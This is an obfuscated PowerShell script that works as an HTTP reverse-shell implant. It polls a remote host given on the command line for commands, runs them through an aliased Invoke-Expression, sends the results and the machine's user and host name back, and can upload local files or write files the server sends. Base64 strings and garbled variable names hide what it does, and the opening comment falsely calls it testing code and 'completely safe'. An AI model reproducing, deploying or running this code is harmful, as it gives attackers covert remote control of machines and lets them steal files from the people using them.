#This is for testing and cpompletely safe
#aa okay
$ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
$ProgressPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
nal -name pwn -Value iex -Force
${___/=\___/\_/\_/\} = $args[1] ; ${_______/\/\/\/\/\} = $args[3]
${__/=\/=\/===\/\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHoAaQBsAGwAYQAvADYALgA0ACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAAMQAxAC4AMQApACAARwBlAGMAawBvAC8AMgAwADEAMAAxADAAMgAgAEYAaQByAGUAZgBvAHgALwA5ADkALgAwAA==')))
${/===\_/==\/\_/\/\} = [int]$PSVersionTable.PSVersion.Major
${/=\_/\/\___/\__/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgA+ACYAMQAgADUAPgAmADEAIAA0AD4AJgAxACAAMwA+ACYAMQA=')))
if (($args[0] -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBoACoA')))) -or ($args[1] -eq $null)){
Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABVAHMAYQBnAGUAOgAgAC4AXABIAFQAVABQAC0AQwBsAGkAZQBuAHQALgBwAHMAMQAgAC0AYwAgAFsASABPAFMAVAA6AFAATwBSAFQAXQAgAC0AcwAgAFsAUwBMAEUARQBQAF0AIAAoAG8AcAB0AGkAbwBuAGEAbAApAAoA'))) -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGQA'))) ; exit }
${__/=\/\_/\_/\/\_/}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwASQBuAHQAZQByAG4AZQB0ACAAUwBlAHQAdABpAG4AZwBzAA==')))
${__/==\/\/\/==\/\/}=(gp -path ${__/=\/\_/\_/\/\_/} ProxyServer 2> $null) ; if (${__/==\/\/\/==\/\/}){
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials }
${/===\__/=\___/\_/} = $(Foreach (${/=\/=\/========\_} in [System.Enum]::GetNames([System.Net.SecurityProtocolType])){
[System.Net.SecurityProtocolType]::${/=\/=\/========\_}}) ; ${_/=\_/\/\_/=\__/\} = [string]${/===\__/=\___/\_/}
${___/=====\/=\_/==} = [System.Net.SecurityProtocolType]"$(${_/=\_/\/\_/=\__/\}.replace(' ',','))"
[System.Net.ServicePointManager]::SecurityProtocol = ${___/=====\/=\_/==}
function ____/\__/\/\/\_/=\ {
   ${__/====\/\/\/=\/\} = $env:username.toLower()+"@"+$env:computername.toLower()
   $pwd = $pwd.path ; echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0APQA9AD0AXAAvAFwALwBcAC8APQBcAC8AXAB9ACEAJABwAHcAZAA='))) | Out-String }
function __/\/======\___/\_ {
   if ($args[0] -eq "-t") { 
      ${_/\/=\/=\/\/==\/=} = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) 2> $null }
   if ($args[0] -eq "-f") { 
      ${_/\/=\/=\/\/==\/=} = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) 2> $null }
   ${_/\/=\/=\/\/==\/=} = ${_/\/=\/=\/\/==\/=}.Split("=")[0] ; ${_/\/=\/=\/\/==\/=} = ${_/\/=\/=\/\/==\/=}.Replace("+", "-") ; ${_/\/=\/=\/\/==\/=} = ${_/\/=\/=\/\/==\/=}.Replace("/", "_") 2> $null
   ${/==\/====\___/\/\} = ${_/\/=\/=\/\/==\/=}.ToCharArray() ; [array]::Reverse(${/==\/====\___/\/\}) ; ${_/=\______/==\_/=} = -join ${/==\/====\___/\/\} 2> $null ; return ${_/=\______/==\_/=} }
function _/=\/=\/=\_/\_/\_/ {
   ${_/\/=\/=\/\/==\/=} = $args[1].ToCharArray() ; [array]::Reverse(${_/\/=\/=\/\/==\/=}) ; ${_/\/=\/=\/\/==\/=} = -join ${_/\/=\/=\/\/==\/=}
   ${_/\/=\/=\/\/==\/=} = [string]${_/\/=\/=\/\/==\/=}.Replace("-", "+") ; ${_/\/=\/=\/\/==\/=} = [string]${_/\/=\/=\/\/==\/=}.Replace("_", "/")
   switch (${_/\/=\/=\/\/==\/=}.Length % 4) { 0 { break } ; 2 { ${_/\/=\/=\/\/==\/=} += "=="; break } ; 3 { ${_/\/=\/=\/\/==\/=} += "="; break }}
   if ($args[0] -eq "-t") {
      ${/==\/====\___/\/\} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${_/\/=\/=\/\/==\/=})) 2> $null }
   if ($args[0] -eq "-f") {
      ${/==\/====\___/\/\} = [System.Convert]::FromBase64String(${_/\/=\/=\/\/==\/=}) } return ${/==\/====\___/\/\} }
function __/=\_/==\_/\/==== {
   param ([string]$url, [string]$method, [string]$body)
   ${_/=\__/\_/\_/\__/} = [System.Net.HttpWebRequest]::Create($url)
   ${_/=\__/\_/\_/\__/}.Timeout = 600000
   ${_/=\__/\_/\_/\__/}.Method = $method ; ${_/=\__/\_/\_/\__/}.UserAgent = ${__/=\/=\/===\/\/=}
   ${_/=\__/\_/\_/\__/}.ContentType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBwAHAAbABpAGMAYQB0AGkAbwBuAC8AeAAtAHcAdwB3AC0AZgBvAHIAbQAtAHUAcgBsAGUAbgBjAG8AZABlAGQA')))
   if ($body) {
      ${/=\/====\_/===\_/} = [System.Text.Encoding]::ASCII.GetBytes($body)
      ${_/\_/\_/==\___/=\} = $(${/==========\/==\_} = ${_/=\__/\_/\_/\__/}.GetRequestStream()) 2> $null
      ${_/\_/\_/==\___/=\} = $(${/==========\/==\_}.Write(${/=\/====\_/===\_/}, 0, ${/=\/====\_/===\_/}.Length)) 2> $null
      ${_/\_/\_/==\___/=\} = $(${/==========\/==\_}.Close()) 2> $null }
   ${_/\_/\_/==\___/=\} = $(${_/==\_/\/===\/=\_} = ${_/=\__/\_/\_/\__/}.GetResponse()) 2> $null
   ${_/\_/\_/==\___/=\} = $(${_/=\_/\________/=} = ${_/==\_/\/===\/=\_}.GetResponseStream()) 2> $null
   ${_/\_/\_/==\___/=\} = $(${/=\/==\/\_/\__/=\} = New-Object System.IO.StreamReader(${_/=\_/\________/=})) 2> $null
   ${_/\_/\_/==\___/=\} = $(${_/===\/\/=\_/\/=\} = ${/=\/==\/\_/\__/=\}.ReadToEnd()) 2> $null
   ${_/\_/\_/==\___/=\} = $(${/=\/==\/\_/\__/=\}.Close()) 2> $null ; ${_/\_/\_/==\___/=\} = $(${_/==\_/\/===\/=\_}.Close()) 2> $null
   return ${_/===\/\/=\_/\/=\} ; $url }
while ($true) {
   if (${___/=\___/\_/\_/\} -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAAqAA==')))) { ${___/=\___/\_/\_/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA='))) + ${___/=\___/\_/\_/\} }
   ${/=\/\___/=\/\__/\} = ____/\__/\/\/\_/=\ ; ${/==\/=\_/\_/\____} = $null ; if (${_______/\/\/\/\/\}) { sleep ${_______/\/\/\/\/\} }
   ${_/\/\/===\/\/\/=\} = $null ; ${/=\_/=====\_/\/=\} = $null ; ${_/\__/\_/\__/\/\_} = $null ; ${/=\_/\_/\_/\/\/\_} = $(__/\/======\___/\_ -t ${/=\/\___/=\/\__/\}) 2> $null
   ${__/==\_/=\__/=\_/} = $(__/=\_/==\_/\/==== $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8APQBcAF8AXwBfAC8AXABfAC8AXABfAC8AXAB9AC8AYQBwAGkALwB2ADEALwBDAGwAaQBlAG4AdAAvAEkAbgBmAG8A'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABPAFMAVAA='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGYAbwA6ACAAJAB7AC8APQBcAF8ALwBcAF8ALwBcAF8ALwBcAC8AXAAvAFwAXwB9AA==')))) 2> $null
   ${_/==\_/\/===\/=\_} = $(${/=\_/=====\_/\/=\} = __/=\_/==\_/\/==== $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8APQBcAF8AXwBfAC8AXABfAC8AXABfAC8AXAB9AC8AYQBwAGkALwB2ADEALwBDAGwAaQBlAG4AdAAvAFQAbwBrAGUAbgA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBFAFQA')))) 2> $null
   ${_/==\_/\/===\/=\_} = $(${/==\/=\_/\_/\____} = _/=\/=\/=\_/\_/\_/ -t (${/=\_/=====\_/\/=\}.Split(" ")[-1])) 2> $null
   if (${/=\_/=====\_/\/=\}) {
   if (${/==\/=\_/\_/\____} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBwAGwAbwBhAGQAKgA=')))) {
      ${/=\___/===\__/\_/} = ${/==\/=\_/\_/\____}.toString().Split("!")[1] ; ${/==\/=\_/\_/\____} = $null
      if (${/=\___/===\__/\_/} -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgA6ACoA')))) { ${/=\___/===\__/\_/} = [string]$pwd + "\" + [string]${/=\___/===\__/\_/} }
      ${__/\______/=\/\__} = $(${__/==\/=\/\___/=\} = __/=\_/==\_/\/==== $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8APQBcAF8AXwBfAC8AXABfAC8AXABfAC8AXAB9AC8AYQBwAGkALwB2ADEALwBDAGwAaQBlAG4AdAAvAEQAbwB3AG4AbABvAGEAZAA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBFAFQA')))) 2> $null
      ${__/==\/=\/\___/=\} = $(_/=\/=\/=\_/\_/\_/ -f ${__/==\/=\/\___/=\}.ToString().Split(" ")[-1]) 2> $null
      [IO.File]::WriteAllBytes($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAF8ALwB9AA=='))), ${__/==\/=\/\___/=\}) 2> $null }
   if (${/==\/=\_/\_/\____} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABvAHcAbgBsAG8AYQBkACoA')))) {
      ${/=\___/===\__/\_/} = ${/==\/=\_/\_/\____}.toString().Split(" ",2)[1].Split("!")[0] ; ${/==\/=\_/\_/\____} = $null
      if (${/=\___/===\__/\_/} -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgA6ACoA')))) { ${/=\___/===\__/\_/} = [string]$pwd + "\" + [string]${/=\___/===\__/\_/} }
      ${__/==\/=\/\___/=\} = $(__/\/======\___/\_ -f $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAF8ALwB9AA==')))) 2> $null
      ${_/\/==\__/\/\_/\_} = $(__/=\_/==\_/\/==== $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8APQBcAF8AXwBfAC8AXABfAC8AXABfAC8AXAB9AC8AYQBwAGkALwB2ADEALwBDAGwAaQBlAG4AdAAvAFUAcABsAG8AYQBkAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABPAFMAVAA='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQA6ACAAJAB7AF8AXwAvAD0APQBcAC8APQBcAC8AXABfAF8AXwAvAD0AXAB9AA==')))) 2> $null }
   if (${/==\/=\_/\_/\____} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AGkAdAA=')))) { exit }
   if (${/===\_/==\/\_/\/\} -gt 4) { if (${/==\/=\_/\_/\____}) { ${_/\__/\_/\__/\/\_} = $(${_/\/\/===\/\/\/=\} = pwn ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwALwA9AFwAXwAvAFwAXwAvAFwAXwBfAF8AXwB9ACAAJAB7AC8APQBcAF8ALwBcAC8AXABfAF8AXwAvAFwAXwBfAC8APQB9AA==')))) | Out-String) 2>&1 }}
   else { if (${/==\/=\_/\_/\____}) { ${_/\__/\_/\__/\/\_} = $(${_/\/\/===\/\/\/=\} = pwn ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwALwA9AFwAXwAvAFwAXwAvAFwAXwBfAF8AXwB9AA==')))) | Out-String) 2>&1 }} ; ${/==\/\_/\_/\_/\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))
   if (${_/\__/\_/\__/\/\_} -ne $null) { ${_/\/\/===\/\/\/=\} = echo $error[0] | Out-String ; ${/==\/\_/\_/\_/\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))) }
   else { if (!${_/\/\/===\/\/\/=\}) { ${_/\/\/===\/\/\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABTAGgAZQBsAGwATgB1AGwAbAA='))) }}
   ${/==\__/===\___/==} = $(__/\/======\___/\_ -t ${_/\/\/===\/\/\/=\}) 2> $null ; [string]${__/\____/=\__/==\} = ${/==\/\_/\_/\_/\/=}
   ${___/=====\/=\/\/=} = $(__/=\_/==\_/\/==== $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8APQBcAF8AXwBfAC8AXABfAC8AXABfAC8AXAB9AC8AYQBwAGkALwB2ADEALwBDAGwAaQBlAG4AdAAvACQAewBfAF8ALwBcAF8AXwBfAF8ALwA9AFwAXwBfAC8APQA9AFwAfQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABPAFMAVAA='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwALwBcAF8ALwBcAF8ALwBcAF8ALwBcAC8APQB9ADoAIAAkAHsALwA9AD0AXABfAF8ALwA9AD0APQBcAF8AXwBfAC8APQA9AH0A')))) 2> $null }}